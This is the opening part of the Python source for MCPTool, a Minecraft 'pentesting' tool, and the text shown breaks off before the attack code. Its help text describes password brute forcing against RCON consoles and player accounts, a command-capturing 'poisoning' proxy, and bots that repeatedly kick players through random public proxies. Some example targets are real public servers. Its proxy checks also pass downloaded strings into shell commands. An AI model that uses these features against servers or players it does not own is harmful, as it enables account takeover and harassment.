#!/usr/bin/python3

# =============================================================================
#                      MCPTool v3.2 www.github.com/wrrulos
#                         Pentesting Tool for Minecraft
#                               Made by wRRulos
#                                  @wrrulos
# =============================================================================

# Any error report it to my discord please, thank you. 
# Programmed in Python 3.11.0

import shutil
import subprocess
import json
import sys
import time
import os
import requests
import socket
import re
import uuid
import hashlib
import base64
import random
import shodan

from datetime import datetime
from colorama import Fore, init
from mcstatus import JavaServer
from json import JSONDecodeError
from mcrcon import MCRcon, MCRconException

# ------------ Colors ----------------

init()
red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
lwhite = Fore.LIGHTWHITE_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
cyan = Fore.CYAN
lcyan = Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
blue = Fore.BLUE
lblue = Fore.LIGHTBLUE_EX
reset = Fore.RESET

# ------------ API ----------------

mojang_api = 'https://api.mojang.com/users/profiles/minecraft/'  # Mojang api
mcsrvstatus_api = 'https://api.mcsrvstat.us/2/'  # MCSrvStatus api
proxy_api = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=1000&country=all&ssl=all&anonymity=all' # Proxy api

# ------------ Variables ----------------

json_characters = ['{', '}', '[', ']', ':', ']', 'false,', 'true,', ',', '"extra"', '"obfuscated"', '"translate"', '"strikethrough"', '"underlined"', '"italic"', '"bold"', '"text"', '"color"', '"red"', '"dark_red"', '"gold"', '"yellow"', '"dark_green"', '"green"', '"aqua"', '"dark_aqua"', '"dark_aqua"', '"dark_blue"', '"blue"', '"light_purple"', '"dark_purple"', '"white"', '"gray"', '"dark_gray"', '"black"', '"', 'clickEventactionopen_urlvalue']  # Json characters
command_list = ['server', 'player', 'ip', 'ipinfo', 'dnslookup', 'search', 'scan', 'host', 'checker', 'listening', 'bungee', 'poisoning', 'rcon', 'auth', 'connect', 'rconnect', 'kick', 'kickall', 'block', 'discord']  # Command list
logs_file, first_node, servers_found, host_command, scan_stopped = '', '', '', '', ''  # Global variables
version_check, server_display_mode, bungee_port, poisoning_port, shodan_token, test_proxy_timeout, node_command, ngrok_command, proxy_command, qubo_threads, qubo_timeout, qubo_command, version, proxy_version, dependencies, current_version, host_list, banner = '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''  # Variables in the 'settings.json' file
check_proxy_update = True
banner = ''

start_banner = f"""
\n\n\n\n\n\n\n\n\n                          {red}`7MMM.     ,MMF' .g8'''bgd `7MM'''Mq. MMP''MM''YMM              `7MM  
                            {red}MMMb    dPMM .dP'     `M   MM   `MM.P'   MM   `7                MM 
                            {red}M YM   ,M MM dM'       `   MM   ,M9      MM  ,pW'Wq.   ,pW'Wq.  MM                         
                            {red}M  Mb  M' MM MM            MMmmdM9       MM 6W'   `Wb 6W'   `Wb M
                            {lwhite}M  YM.P'  MM MM.           MM            MM 8M     M8 8M     M8 MM
                            {lwhite}M  `YM'   MM `Mb.     ,'   MM            MM YA.   ,A9 YA.   ,A9 MM  
                          {lwhite}.JML. `'  .JMML. `'bmmmd'  .JMML.        .JMML.`Ybmd9'   `Ybmd9'.JMML.  \n\n\n"""  # Start Banner
                          

# ------------ Help messages ----------------

help_message = f'''
    {lred}• {lwhite}Commands:

    {lcyan}► {lwhite}Information: {lcyan}server player ip ipinfo dnslookup
    {lgreen}► {lwhite}Scanners: {lgreen}search scan host checker
    {lmagenta}► {lwhite}Attacking: {lmagenta}listening bungee poisoning rcon auth kick kickall block
    {lyellow}► {lwhite}Others: {lyellow}connect rconnect discord'''

help_messages_list_commands = [f'''
    {lred}Command: {lwhite}server
    {lred}Usage: {lwhite}server <ip:port/domain>

    {lwhite}Displays information about a server.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {lwhite}-> IP address and port or domain of the server.

    {lred}Example:
        {lwhite}server {lgreen}hypixel.net
''', f'''
    {lred}Command: {lwhite}player
    {lred}Usage: {lwhite}player <username>

    {lwhite}Displays information about a username.

    {lred}Arguments:
        {lgreen}<username> {lwhite}-> Minecraft username.

    {lred}Example:
        {lwhite}player {lgreen}wRRulos
''', f'''
    {lred}Command: {lwhite}ip
    {lred}Usage: {lwhite}ip <domain>

    {lwhite}Returns the IP address of a domain.

    {lred}Arguments:
        {lgreen}<domain> {lwhite}-> Domain.

    {lred}Example:
        {lwhite}ip {lgreen}mc.universocraft.com
''', f'''
    {lred}Command: {lwhite}ipinfo
    {lred}Usage: {lwhite}ipinfo <ip>

    {lwhite}Returns information of the specified ip

    {lred}Arguments:
        {lgreen}<ip> {lwhite}-> IP address.

    {lred}Example:
        {lwhite}ipinfo {lgreen}51.79.106.228
''', f'''
    {lred}Command: {lwhite}dnslookup
    {lred}Usage: {lwhite}dnslookup <domain>

    {lwhite}Returns the IP address of a domain.

    {lred}Arguments:
        {lgreen}<domain> {lwhite}-> Domain.

    {lred}Example:
        {lwhite}dnslookup {lgreen}mc.universocraft.com
''', f'''
    {lred}Command: {lwhite}search
    {lred}Usage: {lwhite}search <data>

    {lwhite}Find servers that contain the specified data.
    You can add more data separating it with ' --- '

    {lred}Arguments:
        {lgreen}<data> {lwhite}-> Data.

    {lred}Examples:
        {lwhite}search {lgreen}Spigot 1.8.8
        {lwhite}search {lgreen}Spigot 1.8.8 --- Lobby
''', f'''
    {lred}Command: {lwhite}scan
    {lred}Usage: {lwhite}scan <ip> <ports> <method> <send bot: y/n> [<proxy>]

    {lwhite}Scan the ports of an IP address using different types of scanners. 
    (You can also scan a file containing a list of IP addresses)

    {lred}Arguments:
        {lgreen}<ip> {lwhite}-> IP address.
        {lmagenta}<port> {lwhite}-> Range of ports you are going to scan.
        {lyellow}<method> {lwhite}-> The type of scanner you are going to use. (Nmap or qubo)
        {lblue}<send bot: y/n> {lwhite}-> Confirm if a bot should be sent to check the server. If you want to send a bot, enter 'y'.
        {lcyan}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}n
        {lwhite}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}y
        {lwhite}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}y {lcyan}164.60.26.2:7472
        {lwhite}scan {lgreen}127.0.0.1 {lmagenta}25560-25570 {lyellow}0 {lblue}y {lcyan}random
''', f'''
    {lred}Command: {lwhite}host
    {lred}Usage: {lwhite}host <host> <ports> <method> <send bot: y/n> [<proxy>]

    {lwhite}Scan the nodes of a host using different types of scanners.

    {lred}Arguments:
        {lgreen}<host> {lwhite}-> Hostname.
        {lmagenta}<port> {lwhite}-> Range of ports you are going to scan.
        {lyellow}<method> {lwhite}-> The type of scanner you are going to use. (Nmap or qubo)
        {lblue}<send bot: y/n> {lwhite}-> Confirm if a bot should be sent to check the server. If you want to send a bot, enter 'y'.
        {lcyan}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}host {lgreen}minehost {lmagenta}25560-25570 {lyellow}0 {lblue}n
        {lwhite}host {lgreen}vultam {lmagenta}25560-25570 {lyellow}0 {lblue}y
        {lwhite}host {lgreen}vultam {lmagenta}25560-25570 {lyellow}0 {lblue}y {lcyan}164.60.26.2:7472
        {lwhite}host {lgreen}vultam {lmagenta}25560-25570 {lyellow}0 {lblue}y {lcyan}random
''', f'''
    {lred}Command: {lwhite}checker
    {lred}Usage: {lwhite}checker <file> <send bot: y/n> [<proxy>]

    {lwhite}Check if servers found in a file can be accessed.

    {lred}Arguments:
        {lgreen}<file> {lwhite}-> File containing ips addresses.
        {lmagenta}<send bot: y/n> {lwhite}-> Confirm if a bot should be sent to check the server. If you want to send a bot, enter 'y'.
        {lyellow}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}checker {lgreen}file.txt {lmagenta}n
        {lwhite}checker {lgreen}file.txt {lmagenta}y
        {lwhite}checker {lgreen}file.txt {lmagenta}y {lyellow}164.60.26.2:7472
        {lwhite}checker {lgreen}file.txt {lmagenta}y {lyellow}random
''', f'''
    {lred}Command: {lwhite}listening
    {lred}Usage: {lwhite}listening <ip:port/domain>

    {lred}Arguments:
        {lgreen}<ip:port/domain> {lwhite}-> IP address and port or domain of the server.

    {lred}Example:
        {lwhite}listening {lgreen}127.0.0.1:25565
''', f'''
    {lred}Command: {lwhite}bungee
    {lred}Usage: {lwhite}bungee <ip:port/domain>

    {lwhite}Start a proxy server that redirects to the specified server.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {lwhite}-> IP address and port or domain of the server.

    {lred}Example:
        {lwhite}bungee {lgreen}127.0.0.1:25565
''', f'''
    {lred}Command: {lwhite}poisoning
    {lred}Usage: {lwhite}poisoning <ip:port/domain>

    {lwhite}Start a proxy server that redirects to the specified server and captures the commands
    that are sent within it.

    {lred}Arguments:
        {lgreen}<ip:port/domain> {lwhite}-> IP address and port or domain of the server.

    {lred}Example:
        {lwhite}poisoning {lgreen}127.0.0.1:25565
''', f'''
    {lred}Command: {lwhite}rcon
    {lred}Usage: {lwhite}rcon <ip:rcon-port> <file>

    {lwhite}Initiate a brute force attack to access the console. (via RCON)

    {lred}Arguments:
        {lgreen}<ip:rcon-port> {lwhite}-> IP address and rcon port of the server.
        {lmagenta}<file> {lwhite}-> Location of the password dictionary.

    {lred}Example:
        {lwhite}rcon {lgreen}127.0.0.1:25575 {lmagenta}passwords/test.txt
''', f'''
    {lred}Command: {lwhite}auth
    {lred}Usage: {lwhite}auth <ip:port> <username> <protocol> <file>

    {lwhite}Initiate a brute force attack to access the user's account. (via /login)

    {lred}Arguments:
        {lgreen}<ip:port> {lwhite}-> IP address and port of the server.
        {lmagenta}<username> {lwhite}-> Username
        {lyellow}<protocol> {lwhite}-> Server protocol (You can also enter the version. Example: 1.8.8)
        {lblue}<file> {lwhite}-> Location of the password dictionary.

    {lred}Examples:
        {lwhite}auth {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47 {lblue}passwords/test.txt
        {lwhite}auth {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}1.8.8 {lblue}passwords/test.txt
''', f'''
    {lred}Command: {lwhite}connect
    {lred}Usage: {lwhite}connect <ip:port> <username> <protocol> [<proxy>]

    {lwhite}Connect to the server through a bot.

    {lred}Arguments:
        {lgreen}<ip:port> {lwhite}-> IP address and port of the server.
        {lmagenta}<username> {lwhite}-> Username
        {lyellow}<protocol> {lwhite}-> Server protocol (You can also enter the version. Example: 1.8.8)
        {lblue}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}connect {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47
        {lwhite}connect {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47 {lblue}164.60.26.2:7472
        {lwhite}connect {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47 {lblue}random
''', f'''
    {lred}Command: {lwhite}rconnect
    {lred}Usage: {lwhite}rconnect <ip:rcon-port> <password>

    {lwhite}Connect to the server through RCON.

    {lred}Arguments:
        {lgreen}<ip:rcon-port> {lwhite}-> IP address and rcon port of the server.
        {lmagenta}<password> {lwhite}-> RCON Password

    {lred}Example:
        {lwhite}rconnect {lgreen}127.0.0.1:25575 {lmagenta}password 
''', f'''
    {lred}Command: {lwhite}kick
    {lred}Usage: {lwhite}kick <ip:port> <name> <protocol> [<proxy>]

    {lwhite}Kick a player from the server.

    {lred}Arguments:
        {lgreen}<ip:port> {lwhite}-> IP address and port of the server.
        {lmagenta}<name> {lwhite}-> Username
        {lyellow}<protocol> {lwhite}-> Server protocol (You can also enter the version. Example: 1.8.8)
        {lblue}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}kick {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47
        {lwhite}kick {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47 {lblue}164.60.26.2:7472
''', f'''
    {lred}Command: {lwhite}kickall
    {lred}Usage: {lwhite}kickall <ip:port> <protocol> [<proxy>]

    {lwhite}Kick all players from the server.

    {lred}Arguments:
        {lgreen}<ip:port> {lwhite}-> IP address and port of the server.
        {lmagenta}<protocol> {lwhite}-> Server protocol (You can also enter the version. Example: 1.8.8)
        {lyellow}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}kickall {lgreen}127.0.0.1:25565 {lmagenta}47
        {lwhite}kickall {lgreen}127.0.0.1:25565 {lmagenta}47 {lyellow}164.60.26.2:7472
''', f'''
    {lred}Command: {lwhite}block
    {lred}Usage: {lwhite}block <ip:port> <name> <protocol> [<proxy>]

    {lwhite}Kick a player off the server without stopping. (Infinite loop)

    {lred}Arguments:
        {lgreen}<ip:port> {lwhite}-> IP address and port of the server.
        {lmagenta}<name> {lwhite}-> Username
        {lyellow}<protocol> {lwhite}-> Server protocol (You can also enter the version. Example: 1.8.8)
        {lblue}[<proxy>] {lwhite}-> IP address and port of the proxy (socks5) that the bot will use to connect. (This is optional)

    {lred}Examples:
        {lwhite}block {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47
        {lwhite}block {lgreen}127.0.0.1:25565 {lmagenta}wRRulos {lyellow}47 {lblue}164.60.26.2:7472
''']

# ------------ Settings ----------------

def save_settings():
    """
    Read the 'settings.json' file and save the settings.
    """

    global version_check, server_display_mode, bungee_port, poisoning_port, shodan_token, test_proxy_timeout, node_command, ngrok_command, proxy_command, qubo_threads, qubo_timeout, qubo_command, version, proxy_version, dependencies, current_version, host_list, banner
    dependencies, host_list = [], []

    try:
        f = open('settings/settings.json', 'r')
        settings = f.read()
        js = json.loads(settings)
        f.close()

    except FileNotFoundError:
        subprocess.run('cls || clear', shell=True)
        print(f'{start_banner}                         {lred}The configuration file was not found. Open the tool properly to fix this.', end='')
        time.sleep(5)
        sys.exit()

    version_check = js['version_check']  # Decide if you want to check for a possible update when opening the script
    server_display_mode = js['server_display_mode']  # Choose how to display servers. (Available modes: 0 - 1)
    bungee_port = js['bungee_port']  # Defines the port that will be used for the bungee command proxy
    poisoning_port = js['poisoning_port']  # Defines the port that will be used for the proxy of the poisoning command
    shodan_token = js['shodan_token']  # Defines the shodan token to be used
    test_proxy_timeout = js['test_proxy_timeout']  # Defines the time to use to check if a proxy is valid.
    node_command = js['commands']['node_command']  # Define the command to be used for nodejs
    ngrok_command = js['commands']['ngrok_command']  # Define the command to be used for ngrok
    proxy_command = js['commands']['proxy_command']  # Define the command to be used for proxy
    qubo_threads = js['qubo']['threads']  # Qubo threads
    qubo_timeout = js['qubo']['timeout']  # Qubo timeout
    qubo_command = js['qubo']['command']  # Qubo command
    version = js['version']  # Version
    proxy_version = js['proxy_version']  # Proxy version

    for dependence in js['dependencies']:  # Dependencies List
        dependencies.append(dependence)

    for host in js['hosts']:  # Host list
        host_list.append(host['name'])

    version = version.split('///')
    current_version = version[0]
    v = version[1]

    banner = rf"""{red}
                                                            {lwhite}d8b 
                                      d8P                   88P {red}
                                   {lwhite}d888888P                d88  {red}        {lwhite}The Best Pentesting Tool for Minecraft{red} 
      88bd8b,d88b  d8888b?88,.d88b,  {lwhite}?88'   d8888b  d8888b 888  {red}        {lred}      -> Free and open source <-{red}
      88P'`?8P'?8bd8P' `P`?88'  ?88  {lwhite}88P   d8P' ?88d8P' ?88?88  {red}                     {lwhite}Version: {lgreen}{v}{red}
     d88  d88  88P88b      88b  d8P  {lwhite}88b   88b  d8888b  d88 88b {red}
    d88' d88'  88b`?888P'  888888P'  {lwhite}`?8b  `?8888P'`?8888P'  88b{red}        {lcyan}Developed by wrrulos ({lwhite}@wrrulos{lcyan}){red}
                           88P'                                 
                          d88                                   
                          ?8P                                  

"""  # Banner

# ------------ Remove and replace characters ----------------

def remove_json_characters(text):
    """
    Remove and replace json characters
    """

    json_colors = ['"red"', '"dark_red"', '"gold"', '"yellow"', '"dark_green"', '"green"', '"aqua"', '"dark_aqua"', '"dark_blue"', '"blue"', '"light_purple"', '"dark_purple"', '"white"', '"gray"', '"dark_gray"', '"black"', 'text:']
    colored_characters = ['§c', '§4', '§6', '§e', '§2', '§b', '§3', '§1', '§9', '§d', '§5', '§f', '§7', '§8', '§8', '§f']
    num = 0

    for i in json_colors:  # Replace json characters
        try:
            text = text.replace(i, colored_characters[num])
            num += 1

        except IndexError:
            pass

    for character in json_characters:  # Remove json characters
        text = text.replace(character, '')

    if 'translatemultiplayer.disconnect.not_whitelisted' in text or 'You are not whitelisted on this server!' in text:
        text = '§bWhitelist'

    elif 'multiplayer.disconnect.unverified_username' in text:
        if server_display_mode == '1':
            text = '§6Premium Server'

        else:
            text = '§6The server has online mode activated'

    elif 'This server has mods that require Forge to be installed on the client. Contact your server admin for more details.' in text or 'This server has mods that require FML/Forge to be installed on the client. Contact your server admin for more details.' in text:
        text = '§9Forge Server'

    elif 'TCP.onStreamRead' in text:
        text = '§cThe bot could not connect.'

    elif text == '' or len(text) == 1:
        text = '§cThe bot could not connect. (Possibly you were trying to use an invalid version or the connection was refused)'

    elif 'translatemultiplayer.disconnect.banned.reasonwith' in text:
        text = text.replace('translatemultiplayer.disconnect.banned.reasonwith', '§cYou are banned for the following reason: ')

    elif 'translatemultiplayer.disconnect.banned_ip.reasonwith' in text:
        text = text.replace('translatemultiplayer.disconnect.banned_ip.reasonwith', '§cYou are IP banned for the following reason: ')

    elif 'http//Minecraft.netMinecraft.net' in text:
        text = text.replace('http//Minecraft.netMinecraft.net', 'http//Minecraft.net')

    elif 'multiplayer.disconnect.incompatiblewith' in text:
        text = text.replace('multiplayer.disconnect.incompatiblewith', '§cIncompatible versions: ')

    elif 'If you wish to use IP forwarding please enable it in your BungeeCord config as well!' in text:
        text = text.replace('If you wish to use IP forwarding please enable it in your BungeeCord config as well!', '§dIf you wish to use IP forwarding please enable it in your BungeeCord config as well!')

    elif 'Error This server is version' in text and 'please specify the correct version' in text:
        split_text = text.split(' ')

        if server_display_mode == '1':
            text = f'§cThe bot could not connect. [§4{split_text[5]}§c-§4{split_text[10]}§c]'

        else:
            text = f'§cThe bot is using the wrong version. The server is §4{split_text[5]} §cand the bot logged in with version §4{split_text[10]}'

    elif '_-Timeout-_' in text:
        text = text.replace('_-Timeout-_', '§cTimeout')

    elif '_-Login-_' in text:
        text = text.replace('_-Login-_', '§aConnected')

    return text


def remove_color_characters(text):
    """
    Remove colored characters
    """

    colored_characters = ['§0', '§1', '§2', '§3', '§4', '§5', '§6', '§7', '§8', '§9', '§a', '§b', '§c', '§d', '§e', '§f', '§k', '§l', '§m', '§n', '§o', '§r', '§A', '§B', '§C', '§D', '§E', '§F', '§K', '§L', '§M', '§N', '§O', '§R']

    for character in colored_characters:  # Remove colored characters
        text = text.replace(character, '')

    return text


def replace_color_characters(text):
    """
    Replace colored characters with their respective color
    """

    colored_characters = ['§0', '§1', '§2', '§3', '§4', '§5', '§6', '§7', '§8', '§9', '§a', '§b', '§c', '§d', '§e', '§f', '§k', '§l', '§m', '§n', '§o', '§r', '§A', '§B', '§C', '§D', '§E', '§F', '§K', '§L', '§M', '§N', '§O', '§R']
    colors = [lblack, blue, lgreen, cyan, red, magenta, yellow, lblack, lblack, lblue, lgreen, lcyan, lred, lmagenta, lyellow, lwhite, '', '', '', '', '', '', lgreen, lcyan, lred, lmagenta, lyellow, lwhite, '', '', '', '', '', '']
    num = 0

    for character in colored_characters:  # Replace colored characters
        text = text.replace(character, '{}'.format(colors[num]))
        num += 1

    text = text.replace('\n', '')
    return text

# ------------ Functions that get information ------------

def get_data_from_server(server):
    """
    Gets the following data from the server:

    > MOTD
    > Version
    > Protocol
    > Connected players / Maximum player limit
    > Player name list (If possible)

    All data is returned in variables.
    """

    try:
        srv = JavaServer.lookup(server)
        response = srv.status()
        
        motd = response.description
        clean_motd = remove_color_characters(motd)
        motd = replace_color_characters(motd)
        version = response.version.name
        clean_version = remove_color_characters(version)
        version = replace_color_characters(version)
        protocol = response.version.protocol
        connected_players = response.players.online
        player_limit = response.players.max

        if response.players.sample is not None:
            players = str([f'{player.name} ({player.id})' for player in response.players.sample])
            players = players.replace('[', '').replace(']', '').replace("'", '').replace('(00000000-0000-0000-0000-000000000000),', '').replace('(00000000-0000-0000-0000-000000000000)', '')
            re.findall(r'[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]', players)

        else: 
            players = None

        return motd, clean_motd, version, clean_version, protocol, connected_players, player_limit, players

    except (OSError, socket.gaierror, socket.timeout, ValueError):
        return False, 'None', 'None', 'None', 'None', 'None', 'None', 'None'


def get_data_from_server_mcsrvstatus(server):
    """
    Get server data using mcsrvstat.us api
    """

    try:
        r = requests.get(f'{mcsrvstatus_api}{server}')
        r_json = r.json()

    except (requests.exceptions.ConnectionError, requests.exceptions.JSONDecodeError):
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Error connecting to API. Try it again later')
        return None, None, None, None

    try:
        online_players = r_json['players']['online']
        max_players = r_json['players']['max']
        motd = r_json['motd']['raw']

    except KeyError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The connection to the server could not be established. Enter a valid server!')
        return None, None, None, None

    try:
        icon = r_json['icon']
        data = icon.replace('data:image/png;base64,', '')
        image = base64.b64decode(data)

    except KeyError:
        image = None

    return online_players, max_players, motd, image


def get_player(username):
    """
    Gets the following data from the minecraft username:

    > Online UUID
    > Offline UUID
    """

    try:
        r = requests.get(f'{mojang_api}{username}')
        r_json = r.json()

        online_uuid = r_json['id']
        online_uuid = f'{online_uuid[0:8]}-{online_uuid[8:12]}-{online_uuid[12:16]}-{online_uuid[16:21]}-{online_uuid[21:32]}'
        offline_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f'OfflinePlayer:{username}', 'utf-8')).digest()[:16], version=3))
        return online_uuid, offline_uuid

    except JSONDecodeError:
        offline_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f'OfflinePlayer:{username}', 'utf-8')).digest()[:16], version=3))
        return None, offline_uuid


def get_players(target):
    """
    Get the name of the server users
    """

    try:
        srv = JavaServer.lookup(target)
        response = srv.status()

    except (OSError, socket.gaierror, socket.timeout):
        return False, 'Timeout'

    if response.players.sample is not None:
        players = []

        for player in response.players.sample:
            players.append(player.name)

        if len(players) >= 1:
            return players

    return False, 'Players'


def get_ip_port(server):
    """
    Get the ip and port of a Minecraft server using the MCSrvStatus api
    """

    try:
        r = requests.get(f'{mcsrvstatus_api}{server}')       
        r_json = r.json()

        if r_json['debug']['ping']:
            ip = r_json['ip'] 
            port = r_json['port']
            server = f'{ip}:{port}'
            return server

        return False

    except (requests.exceptions.ConnectionError, requests.exceptions.JSONDecodeError):
        return False


def get_proxy():
    """
    Get proxy
    """

    proxy_list = []
    r = requests.get(proxy_api)
    
    date = datetime.now()
    proxy_list_file = f'ProxyList_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'

    f = open(proxy_list_file, 'w+', encoding='utf8')
    f.write(r.text)
    f.close()

    f = open(proxy_list_file, 'r+', encoding='utf8')
    content = f.readlines()
    f.close()
    os.remove(proxy_list_file)

    for line in content:
        if line != '\n':
            line = line.replace('\n', '')
            proxy_list.append(line)

    if len(proxy_list) >= 1:
        for proxy in proxy_list:
            proxy = proxy.split(':')
            output = subprocess.run(f'curl -x "socks5://{proxy[0]}:{proxy[1]}" "http://ifconfig.me" --connect-timeout 6 --no-progress-meter', stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
            output = str(output.stdout).replace("b'", '').replace('\r', '').replace('\n', '').replace("'", '')

            if output == proxy[0]:  # If the answer is the ip address it means that the socks5 proxy is valid!
                return f'{proxy[0]}:{proxy[1]}'

    return None


def get_name():
    """
    Returns a random name for the bot
    """

    names = []

    f = open('settings/files/names.txt', 'r+')
    lines = f.readlines()
    f.close()

    for line in lines:
        if not line == '' or not line == ' ':
            if '\n' in line:
                line = line.replace('\n', '')

            names.append(line)

    return random.choice(names)


def get_host_information(hostname):
    """
    Get host data
    """

    f = open('settings/settings.json', 'r')
    content = f.read()
    f.close()

    js = json.loads(content)

    for host in js['hosts']:
        if host['name'] == hostname:
            return host['nodes'], host['domain']

# ------------ Checks ------------

def check_version():
    """
    Check if there is a new version of the script
    """

    connection = check_connection()

    if connection:
        r = requests.get('https://raw.githubusercontent.com/wrrulos/MCPTool/main/settings/settings.json')  # Get the latest version
        last_version = r.text
        js_version = json.loads(last_version)
        last_version = js_version['version']
        last_version = last_version.split('///')
        last_version = last_version[0]

    else:
        last_version = current_version

    if int(last_version) != int(current_version):
        return True

    return False


def check_server(target):
    """
    Check if servers is on
    """

    try:
        srv = JavaServer.lookup(target)
        srv.status()
        return True

    except (OSError, socket.gaierror, socket.timeout):
        return False


def check_ip(ip):
    """
    Checks if the 'ip' argument are valid.
    """

    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True

    except socket.error:
        return False


def check_port(port):
    """
    Checks if the 'port' argument are valid.
    """

    try:
        if int(port) <= 65535:
            return True

        return False

    except ValueError:
        return False


def check_ip_port(server):
    """
    Check if the ip address and port are valid.
    """

    try:
        server = server.split(':')
        check = check_ip(server[0])

        if check:
            check = check_port(server[1])

            if check:
                return True

        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid IP and port')
        return False

    except IndexError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid IP and port')
        return False


def check_domain(server):
    """
    Check if the entered server is a domain. Otherwise it is an IP address.
    """

    domain = False

    for i in server:
        if domain:
            break

        if i.isdigit() or i == ':' or i == '.':
            continue

        domain = True

    return domain


def check_connection():
    """
    Check for connection via sockets
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    try:
        s.connect(('www.google.com', 80))
        s.close()
        return True

    except (socket.gaierror, socket.timeout):
        return False


def check_scan_method(method):
    """
    Check if the chosen method is correct
    """

    if method == '0' or method == 'nmap':
        return True, '0'

    elif method == '1'  or method == 'qubo':
        return True, '1'

    return False, None


def check_scan_error(scan_file, target):
    """
    Check if there was an error in the scan
    """

    try:
        f = open(scan_file, 'r')
        content = f.read()
        f.close()

    except FileNotFoundError:  # CTRL C
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}File not found.')
        return True

    if 'Ports specified must be between 0 and 65535 inclusive' in content or 'Your port specifications are illegal.' in content or 'Found no matches for the service mask' in content or 'is backwards. Did you mean' in content:  # Nmap
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid port range.')
        return True

    elif f'Failed to resolve "{target}".' in content:  # Nmap
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The IP address or domain entered does not exist.')
        return True

    elif 'QUITTING!' in content:  # Nmap
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Unknown')
        return True

    return False


def check_proxy(proxy):
    """
    Check if the proxy server is active
    """

    ip, port = proxy.split(':')
    output = subprocess.run(f'curl -x "socks5://{ip}:{port}" "http://ifconfig.me" --connect-timeout {test_proxy_timeout} --no-progress-meter', stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    output = str(output.stdout).replace("b'", '').replace('\r', '').replace('\n', '').replace("'", '')

    if output == ip:
        print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lgreen}The proxy {ip}:{port} is valid!')
        time.sleep(1)
        return True

    print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lred}The proxy server did not generate a response. ({red}Timeout{lred})')
    return False


def check_proxy_version():
    """
    Check proxy version
    """

    print(f'\n    {red}[{lred}UPD{lwhite}ATE{red}] {lwhite}Checking if there is a new version of the proxy server.')
    time.sleep(1)

    r = requests.get('https://raw.githubusercontent.com/wrrulos/MCPTool/main/settings/settings.json')  # Get the latest version
    settings = r.text
    json_settings = json.loads(settings)
    latest_proxy_version = json_settings['proxy_version']

    if proxy_version != latest_proxy_version:
        print(f'\n    {red}[{lred}UPD{lwhite}ATE{red}] {lwhite}New version found. Preparing the {lgreen}download{lwhite}..')
        update_proxy(latest_proxy_version)

    else:
        print(f'\n    {red}[{lred}UPD{lwhite}ATE{red}] {lwhite}No updates available.')


def check_encoding(file):
    """
    Returns the encoding type of the file
    """

    try:
        f = open(file, 'r+', encoding='utf8')
        f.read()
        f.close()
        return 'utf8'

    except:
        f = open(file, 'r+', encoding='unicode_escape')
        f.read()
        f.close()
        return 'unicode_escape'


def check_folder(*args):
    """ 
    Check if the following folders exist 
    """

    for folder in args:
        if os.path.isdir(folder):
            pass

        else:
            os.mkdir(folder)

# ------------ Others ------------

def show_server(ip, motd, version, protocol, connected_players, player_limit, players, connect_bot, proxy, forced_mode):
    """
    Show server data on screen
    """

    clean_output = None

